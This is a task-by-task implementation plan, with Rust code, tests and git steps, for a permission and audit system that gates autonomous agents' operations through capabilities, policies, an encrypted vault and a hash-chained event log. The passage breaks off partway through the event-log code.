# Mission Clearance Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a Rust-based autonomous agent permission system that intercepts operations through a hybrid kernel architecture with capabilities, operation policies, encrypted vault, and full trace graph.

**Architecture:** Hybrid kernel — capabilities for structural access control, operation policies for behavioral safety. Transparent proxy intercepts HTTP/DB/shell/tool-calls. Policy pipeline: deterministic → LLM → human. Append-only event log + materialized mission graph.

**Tech Stack:** Rust, tokio, axum, rusqlite, aes-gcm, argon2, serde, uuid, chrono, reqwest, clap

**Design doc:** `docs/plans/2026-03-01-mission-clearance-design.md`

---

## Dependency Order

```
mc-core (no deps)
  ├── mc-vault (mc-core)
  ├── mc-trace (mc-core)
  └── mc-kernel (mc-core, mc-trace)
        └── mc-policy (mc-core, mc-kernel, mc-trace)
              └── mc-adapters (mc-core, mc-kernel, mc-policy, mc-vault, mc-trace)
                    └── mc-api (mc-core, mc-kernel, mc-policy, mc-vault, mc-trace, mc-adapters)
                          ├── mc-sdk (mc-core, mc-api)
                          └── mc-cli (all crates)
```

---

### Task 1: Workspace Scaffold

**Files:**
- Create: `Cargo.toml` (workspace root)
- Create: `crates/mc-core/Cargo.toml`
- Create: `crates/mc-core/src/lib.rs`
- Create: `.gitignore`

**Step 1: Create workspace root Cargo.toml**

```toml
[workspace]
resolver = "2"
members = ["crates/*"]

[workspace.package]
version = "0.1.0"
edition = "2024"
license = "MIT"

[workspace.dependencies]
serde = { version = "1", features = ["derive"] }
serde_json = "1"
uuid = { version = "1", features = ["v4", "serde"] }
chrono = { version = "0.4", features = ["serde"] }
thiserror = "2"
anyhow = "1"
tokio = { version = "1", features = ["full"] }
tracing = "0.1"
```

**Step 2: Create mc-core crate**

`crates/mc-core/Cargo.toml`:
```toml
[package]
name = "mc-core"
version.workspace = true
edition.workspace = true

[dependencies]
serde.workspace = true
serde_json.workspace = true
uuid.workspace = true
chrono.workspace = true
thiserror.workspace = true
```

`crates/mc-core/src/lib.rs`:
```rust
pub mod capability;
pub mod mission;
pub mod operation;
pub mod policy;
pub mod resource;
pub mod trace;
pub mod vault;
```

**Step 3: Create .gitignore**

```
/target
*.swp
.DS_Store
```

**Step 4: Verify workspace compiles**

Run: `cargo check`
Expected: Success (empty modules)

**Step 5: Commit**

```bash
git add Cargo.toml crates/mc-core/ .gitignore
git commit -m "feat: scaffold workspace with mc-core crate"
```

---

### Task 2: mc-core — Resource Types & Pattern Matching

**Files:**
- Create: `crates/mc-core/src/resource.rs`

**Step 1: Write failing tests for ResourceUri and ResourcePattern**

Add to `crates/mc-core/src/resource.rs`:

```rust
use serde::{Deserialize, Serialize};
use std::fmt;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum ResourceError {
    #[error("invalid resource URI: {0}")]
    InvalidUri(String),
    #[error("invalid resource pattern: {0}")]
    InvalidPattern(String),
}

/// A concrete resource URI like `http://api.github.com/repos/myorg/repo1`
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct ResourceUri(String);

/// A resource pattern with optional wildcards like `http://api.github.com/repos/myorg/*`
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct ResourcePattern(String);

impl ResourceUri {
    pub fn new(uri: &str) -> Result<Self, ResourceError> {
        if uri.is_empty() {
            return Err(ResourceError::InvalidUri("empty URI".into()));
        }
        // Must have a scheme
        if !uri.contains("://") {
            return Err(ResourceError::InvalidUri(format!("missing scheme: {uri}")));
        }
        Ok(Self(uri.to_string()))
    }

    pub fn scheme(&self) -> &str {
        self.0.split("://").next().unwrap_or("")
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl ResourcePattern {
    pub fn new(pattern: &str) -> Result<Self, ResourceError> {
        if pattern.is_empty() {
            return Err(ResourceError::InvalidPattern("empty pattern".into()));
        }
        if !pattern.contains("://") {
            return Err(ResourceError::InvalidPattern(format!("missing scheme: {pattern}")));
        }
        Ok(Self(pattern.to_string()))
    }

    /// Check if a concrete ResourceUri matches this pattern.
    /// Supports `*` as a wildcard for a single path segment and `**` for any depth.
    pub fn matches(&self, uri: &ResourceUri) -> bool {
        let pattern = &self.0;
        let target = uri.as_str();

        // Split into scheme + rest
        let (pat_scheme, pat_path) = match pattern.split_once("://") {
            Some(parts) => parts,
            None => return false,
        };
        let (uri_scheme, uri_path) = match target.split_once("://") {
            Some(parts) => parts,
            None => return false,
        };

        if pat_scheme != uri_scheme {
            return false;
        }

        let pat_segments: Vec<&str> = pat_path.split('/').collect();
        let uri_segments: Vec<&str> = uri_path.split('/').collect();

        Self::match_segments(&pat_segments, &uri_segments)
    }

    fn match_segments(pattern: &[&str], target: &[&str]) -> bool {
        if pattern.is_empty() && target.is_empty() {
            return true;
        }
        if pattern.is_empty() {
            return false;
        }

        if pattern[0] == "**" {
            // ** matches zero or more segments
            for i in 0..=target.len() {
                if Self::match_segments(&pattern[1..], &target[i..]) {
                    return true;
                }
            }
            return false;
        }

        if target.is_empty() {
            return false;
        }

        if pattern[0] == "*" || pattern[0] == target[0] {
            return Self::match_segments(&pattern[1..], &target[1..]);
        }

        false
    }

    /// Check if this pattern is a subset of (narrower than or equal to) another pattern.
    /// Used for delegation validation — child patterns must be subsets of parent patterns.
    pub fn is_subset_of(&self, parent: &ResourcePattern) -> bool {
        // A pattern A is a subset of B if every URI matching A also matches B.
        // Heuristic: A is subset of B if B's pattern is a prefix of A's pattern
        // (with wildcards considered). For exact correctness we check structurally.
        //
        // Simple cases:
        // "http://a.com/x/y" is subset of "http://a.com/x/*"
        // "http://a.com/x/*" is subset of "http://a.com/**"
        // "http://a.com/**" is NOT subset of "http://a.com/x/*"

        let (self_scheme, self_path) = match self.0.split_once("://") {
            Some(parts) => parts,
            None => return false,
        };
        let (parent_scheme, parent_path) = match parent.0.split_once("://") {
            Some(parts) => parts,
            None => return false,
        };

        if self_scheme != parent_scheme {
            return false;
        }

        let self_segs: Vec<&str> = self_path.split('/').collect();
        let parent_segs: Vec<&str> = parent_path.split('/').collect();

        Self::subset_segments(&self_segs, &parent_segs)
    }

    fn subset_segments(child: &[&str], parent: &[&str]) -> bool {
        // If parent is empty, child must also be empty
        if parent.is_empty() {
            return child.is_empty();
        }

        // Parent ** matches anything — child is always a subset
        if parent[0] == "**" {
            return true;
        }

        if child.is_empty() {
            return false;
        }

        // If child has **, it can match anything — only subset if parent also has **
        if child[0] == "**" {
            return parent[0] == "**";
        }

        // Child * is subset of parent * or parent **
        if child[0] == "*" {
            if parent[0] == "*" || parent[0] == "**" {
                return Self::subset_segments(&child[1..], &parent[1..]);
            }
            return false;
        }

        // Child is literal
        if parent[0] == "*" || parent[0] == child[0] {
            return Self::subset_segments(&child[1..], &parent[1..]);
        }

        false
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for ResourceUri {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl fmt::Display for ResourcePattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_resource_uri_valid() {
        let uri = ResourceUri::new("http://api.github.com/repos/myorg/repo1").unwrap();
        assert_eq!(uri.scheme(), "http");
    }

    #[test]
    fn test_resource_uri_invalid() {
        assert!(ResourceUri::new("").is_err());
        assert!(ResourceUri::new("no-scheme").is_err());
    }

    #[test]
    fn test_pattern_exact_match() {
        let pattern = ResourcePattern::new("http://api.github.com/repos/myorg/repo1").unwrap();
        let uri = ResourceUri::new("http://api.github.com/repos/myorg/repo1").unwrap();
        assert!(pattern.matches(&uri));
    }

    #[test]
    fn test_pattern_wildcard_single() {
        let pattern = ResourcePattern::new("http://api.github.com/repos/myorg/*").unwrap();
        let uri1 = ResourceUri::new("http://api.github.com/repos/myorg/repo1").unwrap();
        let uri2 = ResourceUri::new("http://api.github.com/repos/myorg/repo2").unwrap();
        let uri3 = ResourceUri::new("http://api.github.com/repos/other/repo1").unwrap();
        assert!(pattern.matches(&uri1));
        assert!(pattern.matches(&uri2));
        assert!(!pattern.matches(&uri3));
    }

    #[test]
    fn test_pattern_wildcard_deep() {
        let pattern = ResourcePattern::new("http://api.github.com/**").unwrap();
        let uri1 = ResourceUri::new("http://api.github.com/repos/myorg/repo1").unwrap();
        let uri2 = ResourceUri::new("http://api.github.com/users").unwrap();
        assert!(pattern.matches(&uri1));
        assert!(pattern.matches(&uri2));
    }

    #[test]
    fn test_pattern_scheme_mismatch() {
        let pattern = ResourcePattern::new("https://api.github.com/**").unwrap();
        let uri = ResourceUri::new("http://api.github.com/repos").unwrap();
        assert!(!pattern.matches(&uri));
    }

    #[test]
    fn test_subset_exact_of_wildcard() {
        let child = ResourcePattern::new("http://a.com/x/y").unwrap();
        let parent = ResourcePattern::new("http://a.com/x/*").unwrap();
        assert!(child.is_subset_of(&parent));
    }

    #[test]
    fn test_subset_wildcard_of_doublestar() {
        let child = ResourcePattern::new("http://a.com/x/*").unwrap();
        let parent = ResourcePattern::new("http://a.com/**").unwrap();
        assert!(child.is_subset_of(&parent));
    }

    #[test]
    fn test_subset_doublestar_not_of_wildcard() {
        let child = ResourcePattern::new("http://a.com/**").unwrap();
        let parent = ResourcePattern::new("http://a.com/x/*").unwrap();
        assert!(!child.is_subset_of(&parent));
    }
}
```

**Step 2: Run tests to verify they pass**

Run: `cargo test -p mc-core`
Expected: All tests pass

**Step 3: Commit**

```bash
git add crates/mc-core/src/resource.rs
git commit -m "feat(mc-core): add resource URI and pattern matching with wildcards"
```

---

### Task 3: mc-core — ID Types, Operation, Capability, Mission

**Files:**
- Create: `crates/mc-core/src/id.rs`
- Create: `crates/mc-core/src/operation.rs`
- Create: `crates/mc-core/src/capability.rs`
- Create: `crates/mc-core/src/mission.rs`
- Modify: `crates/mc-core/src/lib.rs` (add `pub mod id;`)

**Step 1: Create ID wrapper types**

`crates/mc-core/src/id.rs`:
```rust
use serde::{Deserialize, Serialize};
use std::fmt;
use uuid::Uuid;

macro_rules! define_id {
    ($name:ident) => {
        #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
        pub struct $name(Uuid);

        impl $name {
            pub fn new() -> Self {
                Self(Uuid::new_v4())
            }

            pub fn from_uuid(uuid: Uuid) -> Self {
                Self(uuid)
            }

            pub fn as_uuid(&self) -> &Uuid {
                &self.0
            }
        }

        impl fmt::Display for $name {
            fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                write!(f, "{}", self.0)
            }
        }

        impl Default for $name {
            fn default() -> Self {
                Self::new()
            }
        }
    };
}

define_id!(MissionId);
define_id!(CapabilityId);
define_id!(RequestId);
define_id!(PolicyId);
define_id!(VaultEntryId);
define_id!(EventId);
define_id!(MissionToken);
```

**Step 2: Create Operation enum**

`crates/mc-core/src/operation.rs`:
```rust
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum Operation {
    Read,
    Write,
    Execute,
    Delete,
    Connect,
    Delegate,
}

/// Classification of an operation's risk profile.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OperationClassification {
    pub destructiveness: Destructiveness,
    pub reversibility: Reversibility,
    pub blast_radius: BlastRadius,
    pub data_flow: DataFlowDirection,
    pub target_trust: TrustLevel,
    pub pattern: OperationPattern,
    pub goal_relevance: GoalRelevance,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Destructiveness {
    None,
    Low,
    Medium,
    High,
    Catastrophic,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Reversibility {
    Reversible,
    PartiallyReversible,
    Irreversible,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum BlastRadius {
    Single,
    Local,
    Service,
    Global,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DataFlowDirection {
    Inbound,
    Outbound,
    Internal,
    ExfiltrationSuspected,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum TrustLevel {
    Known,
    Unknown,
    Untrusted,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum OperationPattern {
    Normal,
    Unusual,
    Suspicious,
    KnownMalicious,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum GoalRelevance {
    DirectlyRelevant,
    TangentiallyRelevant,
    Unrelated,
    Contradictory,
}

/// Protocol-specific context attached to an operation request.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum OperationContext {
    Http {
        method: String,
        headers: Vec<(String, String)>,
        body_preview: Option<String>,
    },
    Database {
        query: String,
        database: String,
    },
    Shell {
        command: String,
        args: Vec<String>,
        working_dir: Option<String>,
    },
    ToolCall {
        tool_name: String,
        arguments: serde_json::Value,
    },
}

/// A normalized operation request — the "syscall".
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OperationRequest {
    pub id: crate::id::RequestId,
    pub mission_id: crate::id::MissionId,
    pub resource: crate::resource::ResourceUri,
    pub operation: Operation,
    pub context: OperationContext,
    pub justification: String,
    pub chain: Vec<crate::id::RequestId>,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}
```

**Step 3: Create Capability type**

`crates/mc-core/src/capability.rs`:
```rust
use crate::id::CapabilityId;
use crate::operation::Operation;
use crate::resource::ResourcePattern;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

/// Rate/time constraints on a capability.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Constraints {
    /// Max operations per window
    pub max_rate: Option<u32>,
    /// Window duration in seconds
    pub rate_window_secs: Option<u64>,
    /// Absolute expiry time
    pub expires_at: Option<chrono::DateTime<chrono::Utc>>,
}

impl Default for Constraints {
    fn default() -> Self {
        Self {
            max_rate: None,
            rate_window_secs: None,
            expires_at: None,
        }
    }
}

/// A bounded permission over a resource — like a file descriptor.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Capability {
    pub id: CapabilityId,
    pub resource_pattern: ResourcePattern,
    pub operations: HashSet<Operation>,
    pub constraints: Constraints,
    pub delegatable: bool,
}

impl Capability {
    /// Check if this capability covers the given resource + operation.
    pub fn covers(&self, resource: &crate::resource::ResourceUri, op: &Operation) -> bool {
        self.operations.contains(op) && self.resource_pattern.matches(resource)
    }

    /// Check if a proposed child capability is a valid narrowing of this one.
    pub fn can_delegate_to(&self, child: &Capability) -> bool {
        if !self.delegatable {
            return false;
        }
        // Child operations must be a subset
        if !child.operations.is_subset(&self.operations) {
            return false;
        }
        // Child resource pattern must be a subset (narrower or equal)
        child.resource_pattern.is_subset_of(&self.resource_pattern)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::resource::{ResourcePattern, ResourceUri};

    fn make_cap(pattern: &str, ops: &[Operation], delegatable: bool) -> Capability {
        Capability {
            id: CapabilityId::new(),
            resource_pattern: ResourcePattern::new(pattern).unwrap(),
            operations: ops.iter().cloned().collect(),
            constraints: Constraints::default(),
            delegatable,
        }
    }

    #[test]
    fn test_covers_matching() {
        let cap = make_cap("http://api.com/repos/*", &[Operation::Read], true);
        let uri = ResourceUri::new("http://api.com/repos/foo").unwrap();
        assert!(cap.covers(&uri, &Operation::Read));
        assert!(!cap.covers(&uri, &Operation::Write));
    }

    #[test]
    fn test_delegation_valid_narrowing() {
        let parent = make_cap("http://api.com/repos/*", &[Operation::Read, Operation::Write], true);
        let child = make_cap("http://api.com/repos/foo", &[Operation::Read], true);
        assert!(parent.can_delegate_to(&child));
    }

    #[test]
    fn test_delegation_rejects_broadening() {
        let parent = make_cap("http://api.com/repos/foo", &[Operation::Read], true);
        let child = make_cap("http://api.com/repos/*", &[Operation::Read], true);
        assert!(!parent.can_delegate_to(&child));
    }

    #[test]
    fn test_delegation_rejects_non_delegatable() {
        let parent = make_cap("http://api.com/**", &[Operation::Read], false);
        let child = make_cap("http://api.com/repos/foo", &[Operation::Read], true);
        assert!(!parent.can_delegate_to(&child));
    }
}
```

**Step 4: Create Mission type**

`crates/mc-core/src/mission.rs`:
```rust
use crate::id::{CapabilityId, MissionId, MissionToken, PolicyId};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum MissionStatus {
    Created,
    Active,
    Suspended,
    Completed,
    Failed,
    Revoked,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Mission {
    pub id: MissionId,
    pub parent: Option<MissionId>,
    pub token: MissionToken,
    pub goal: String,
    pub capabilities: HashSet<CapabilityId>,
    pub policies: Vec<PolicyId>,
    pub status: MissionStatus,
    pub depth: u32,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

impl Mission {
    pub fn is_active(&self) -> bool {
        self.status == MissionStatus::Active
    }

    pub fn is_terminal(&self) -> bool {
        matches!(
            self.status,
            MissionStatus::Completed | MissionStatus::Failed | MissionStatus::Revoked
        )
    }
}
```

**Step 5: Update lib.rs and run tests**

Update `crates/mc-core/src/lib.rs`:
```rust
pub mod id;
pub mod capability;
pub mod mission;
pub mod operation;
pub mod policy;
pub mod resource;
pub mod trace;
pub mod vault;
```

Run: `cargo test -p mc-core`
Expected: All tests pass

**Step 6: Commit**

```bash
git add crates/mc-core/
git commit -m "feat(mc-core): add ID types, operations, capabilities, missions"
```

---

### Task 4: mc-core — Policy, Trace, Vault Types

**Files:**
- Create: `crates/mc-core/src/policy.rs`
- Create: `crates/mc-core/src/trace.rs`
- Create: `crates/mc-core/src/vault.rs`

**Step 1: Create Policy types**

`crates/mc-core/src/policy.rs`:
```rust
use crate::id::PolicyId;
use crate::operation::{OperationClassification, OperationRequest};
use crate::resource::ResourcePattern;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PolicyScope {
    Global,
    Resource(/* bound at creation */),
    Mission(/* bound at creation */),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PolicyEvaluatorType {
    Deterministic,
    Llm,
    Human,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PolicyDecisionKind {
    Allow,
    Deny,
    Escalate,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyDecision {
    pub policy_id: PolicyId,
    pub kind: PolicyDecisionKind,
    pub reasoning: String,
    pub evaluator: PolicyEvaluatorType,
}

/// Trait for policy evaluators in the pipeline.
pub trait PolicyEvaluator: Send + Sync {
    fn evaluate(
        &self,
        request: &OperationRequest,
        classification: &OperationClassification,
        context: &EvaluationContext,
    ) -> PolicyDecision;

    fn evaluator_type(&self) -> PolicyEvaluatorType;
}

/// Context provided to policy evaluators.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvaluationContext {
    pub mission_goal: String,
    pub mission_chain: Vec<String>,
    pub recent_operations: Vec<OperationSummary>,
    pub anomaly_history: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OperationSummary {
    pub resource: String,
    pub operation: String,
    pub decision: PolicyDecisionKind,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// A stored policy definition.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Policy {
    pub id: PolicyId,
    pub name: String,
    pub scope: PolicyScope,
    pub evaluator: PolicyEvaluatorType,
    pub priority: u32,
    pub rule: PolicyRule,
}

/// The rule body — deterministic rules are expressions, LLM/human are prompts.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PolicyRule {
    DenyWhen(String),
    EscalateWhen(String),
    AllowWhen(String),
    LlmPrompt(String),
    HumanPrompt(String),
}
```

**Step 2: Create Trace types**

`crates/mc-core/src/trace.rs`:
```rust
use crate::id::*;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TraceEvent {
    pub id: EventId,
    pub sequence: u64,
    pub timestamp: DateTime<Utc>,
    pub mission_id: MissionId,
    pub event_type: TraceEventType,
    pub parent_event: Option<EventId>,
    pub payload: serde_json::Value,
    pub prev_hash: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TraceEventType {
    // Mission lifecycle
    MissionCreated,
    MissionDelegated,
    MissionCompleted,
    MissionRevoked,
    MissionSuspended,
    MissionResumed,

    // Operation flow
    OperationRequested,
    OperationClassified,
    CapabilityChecked,
    PolicyEvaluated,
    OperationAllowed,
    OperationDenied,
    OperationEscalated,

    // Human interaction
    HumanPrompted,
    HumanResponded,

    // Vault
    CredentialAccessed,
    CredentialRotated,
    CredentialRevoked,

    // Anomaly
    TaintDetected,
    GoalDriftDetected,
    PromptInjectionSuspected,
}

/// Format for graph export.
#[derive(Debug, Clone, Copy)]
pub enum GraphFormat {
    Dot,
    Json,
}

/// A node in the mission graph.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum GraphNode {
    Mission { id: MissionId, goal: String },
    Operation { id: RequestId, resource: String },
    Decision { id: EventId, kind: String },
}

/// An edge in the mission graph.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphEdge {
    pub from: EventId,
    pub to: EventId,
    pub edge_type: EdgeType,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EdgeType {
    Spawned,
    Performed,
    Caused,
    EvaluatedBy,
    EscalatedTo,
    Accessed,
}
```

**Step 3: Create Vault types**

`crates/mc-core/src/vault.rs`:
```rust
use crate::id::VaultEntryId;
use crate::resource::ResourcePattern;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SecretType {
    ApiKey,
    BearerToken,
    Certificate,
    ConnectionString,
    Password,
    SshKey,
    Custom,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum RotationPolicy {
    TimeBased { interval_days: u32 },
    UsageBased { max_uses: u64 },
}

/// Metadata for a vault entry (no secret value — that stays encrypted in storage).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VaultEntryMetadata {
    pub id: VaultEntryId,
    pub name: String,
    pub secret_type: SecretType,
    pub bound_to: HashSet<ResourcePattern>,
    pub rotation_policy: Option<RotationPolicy>,
    pub created_at: DateTime<Utc>,
    pub last_rotated: Option<DateTime<Utc>>,
    pub revoked: bool,
}

/// A decrypted credential ready for injection.
#[derive(Debug, Clone)]
pub struct Credential {
    pub entry_id: VaultEntryId,
    pub secret_type: SecretType,
    pub value: String,
}

/// How to inject a credential into a request.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum InjectionMethod {
    HttpHeader { name: String },
    HttpBearerToken,
    EnvironmentVariable { name: String },
    ConnectionStringRewrite,
    ToolCallParameter { parameter_name: String },
}
```

**Step 4: Run full mc-core test suite**

Run: `cargo test -p mc-core`
Expected: All tests pass

**Step 5: Commit**

```bash
git add crates/mc-core/src/
git commit -m "feat(mc-core): add policy, trace, and vault types"
```

---

### Task 5: mc-trace Crate — Event Log with Cryptographic Chaining

**Files:**
- Create: `crates/mc-trace/Cargo.toml`
- Create: `crates/mc-trace/src/lib.rs`
- Create: `crates/mc-trace/src/event_log.rs`
- Create: `crates/mc-trace/src/graph.rs`
- Create: `crates/mc-trace/src/query.rs`

**Step 1: Create crate with dependencies**

`crates/mc-trace/Cargo.toml`:
```toml
[package]
name = "mc-trace"
version.workspace = true
edition.workspace = true

[dependencies]
mc-core = { path = "../mc-core" }
serde.workspace = true
serde_json.workspace = true
uuid.workspace = true
chrono.workspace = true
thiserror.workspace = true
anyhow.workspace = true
rusqlite = { version = "0.32", features = ["bundled"] }
sha2 = "0.10"
hex = "0.4"
tracing.workspace = true
```

**Step 2: Implement event log with chaining**

`crates/mc-trace/src/event_log.rs`:
```rust
use anyhow::Result;
use mc_core::id::{EventId, MissionId};
use mc_core::trace::{TraceEvent, TraceEventType};
use rusqlite::Connection;
use sha2::{Digest, Sha256};

pub struct EventLog {
    conn: Connection,
}

impl EventLog {
    pub fn new(path: &str) -> Result<Self> {
        let conn = if path == ":memory:" {
            Connection::open_in_memory()?
        } else {
            Connection::open(path)?
        };
        let log = Self { conn };
        log.init_schema()?;
        Ok(log)
    }

    fn init_schema(&self) -> Result<()> {
        self.conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS events (
                id TEXT PRIMARY KEY,
                sequence INTEGER NOT NULL UNIQUE,
                timestamp TEXT NOT NULL,
                mission_id TEXT NOT NULL,
                event_type TEXT NOT NULL,
                parent_event TEXT,
                payload TEXT NOT NULL,
                prev_hash TEXT NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_events_mission ON events(mission_id);
            CREATE INDEX IF NOT EXISTS idx_events_sequence ON events(sequence);
            CREATE INDEX IF NOT EXISTS idx_events_type ON events(event_type);",
        )?;
        Ok(())
    }

    fn next_sequence(&self) -> Result<u64> {
        let seq: Option<u64> = self
            .conn
            .query_row("SELECT MAX(sequence) FROM events", [], |row| row.get(0))?;
        Ok(seq.map(|s| s + 1).unwrap_or(0))
    }

    fn last_hash(&self) -> Result<String> {
        let hash: Option<String> = self
            .conn
            .query_row(
                "SELECT prev_hash FROM events ORDER BY sequence DESC LIMIT 1",
                [],
                |row| row.get(0),
            )
            .ok();
        Ok(hash.unwrap_or_else(|| "genesis".to_string()))
    }

    fn compute_hash(event: &TraceEvent) -> String {
        let mut hasher = Sha256::new();
        hasher.update(event.id.to_string().as_bytes());
        hasher.update(event.sequence.to_le_bytes());
        hasher.update(event.prev_hash.as_bytes());
        hasher.update(event.payload.to_string().as_bytes());
        hex::encode(hasher.finalize())
    }

    pub fn append(
        &mut self,
        mission_id: MissionId,
        event_type: TraceEventType,
        parent_event: Option<EventId>,
        payload: serde_json::Value,
    ) -> Result<TraceEvent> {
        let sequence = self.next_sequence()?;
        let prev_hash = if sequence == 0 {
            "genesis".to_string()
        } else {
            // Hash of the previous event
            let prev: String = self.conn.query_row(
                "SELECT id || sequence || prev_hash || payload FROM events WHERE sequence = ?",
                [sequence - 1],
                |row| row.get(0),
            )?;
            let mut hasher = Sha256::new();
            hasher.update(prev.as_bytes());
            hex::encode(hasher.finalize())
        };

        let event = TraceEvent {
            id: EventId::new(),
            sequence,
            timestamp: chrono::Utc::now(),
            mission_id,
            event_type: event_type.clone(),
            parent_event,
            payload: payload.clone(),
            prev_hash,
        };

        self.conn.execute(
            "INSERT INTO events (id, sequence, timestamp, mission_id, event_type, parent_event, payload, prev_hash)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            rusqlite::params![
                event.id.to_string(),
                event.sequence,
                event.timestamp.to_rfc3339(),
                event.mission_id.to_string(),
                serde_json::to_string(&event.event_type)?,
                event.parent_event.map(|e| e.to_string()),
                serde_json::to_string(&event.payload)?,
                event.prev_hash,
            ],
        )?;

        Ok(event)
    }

    pub fn get_events_for_mission(&self, mission_id: &MissionId) -> Result<Vec<TraceEvent>> {
        let mut stmt = self.conn.prepare(
            "SELECT id, sequence, timestamp, mission_id, event_type, parent_event, payload, prev_hash
             FROM events WHERE mission_id = ? ORDER BY sequence",
        )?;

        let events = stmt
            .query_map([mission_id.to_string()], |row| {
                Ok(TraceEventRow {
                    id: row.get(0)?,
                    sequence: row.get(1)?,
                    timestamp: row.get(2)?,
                    mission_id: row.get(3)?,
                    event_type: row.get(4)?,
                    parent_event: row.get(5)?,
                    payload: row.get(6)?,
                    prev_hash: row.get(7)?,
                })
            })?
            .filter_map(|r| r.ok())
            .filter_map(|row| row.into_trace_event().ok())
            .collect();

        Ok(events)
    }

    pub fn get_recent(&self, limit: u32) -> Result<Vec<TraceEvent>> {
        let mut stmt = self.conn.prepare(
            "SELECT id, sequence, timestamp, mission_id, event_type, parent_event, payload, prev_hash
             FROM events ORDER BY sequence DESC LIMIT ?",
        )?;

        let events = stmt
            .query_map([limit], |row| {
                Ok(TraceEventRow {
                    id: row.get(0)?,
                    sequence: row.get(1)?,
                    timestamp: row.get(2)?,
                    mission_id: row.get(3)?,
                    event_type: row.get(4)?,
                    parent_event: row.get(5)?,
                    payload: row.get(6)?,
                    prev_hash: row.get(7)?,
                })
            })?
            .filter_map(|r| r.ok())
            .filter_map(|row| row.into_trace_event().ok())
            .collect();

        Ok(events)
    }

    pub fn verify_chain_integrity(&self) -> Result<bool> {
        let mut stmt = self.conn.prepare(
            "SELECT id, sequence, prev_hash, payload FROM events ORDER BY sequence",
        )?;

        let rows: Vec<(String, u64, String, String)> = stmt
            .query_map([], |row| {
                Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?))
            })?
            .filter_map(|r| r.ok())
            .collect();

        for i in 1..rows.len() {
            let prev = &rows[i - 1];
            let curr = &rows[i];
            let expected_prev_hash = {
                let data = format!("{}{}{}{}", prev.0, prev.1, prev.2, prev.3);
                let mut hasher = Sha256::new();
                hasher.update(data.as_bytes());
                hex::encode(hasher.finalize())
            };
            if curr.2 != expected_prev_hash {
                return Ok(false);
            }
        }

        Ok(true)
    }
}

struct TraceEventRow {
    id: String,
    sequence: u64,
    timestamp: String,
    mission_id: String,
    event_type: String,
    parent_event: Option<String>,
    payload: String,
    prev_hash: String,
}

impl TraceEventRow {
    fn into_trace_event(self) -> Result<TraceEvent> {
        Ok(TraceEvent {
            id: EventId::from_uuid(self.id.parse()?),
            sequence: self.sequence,
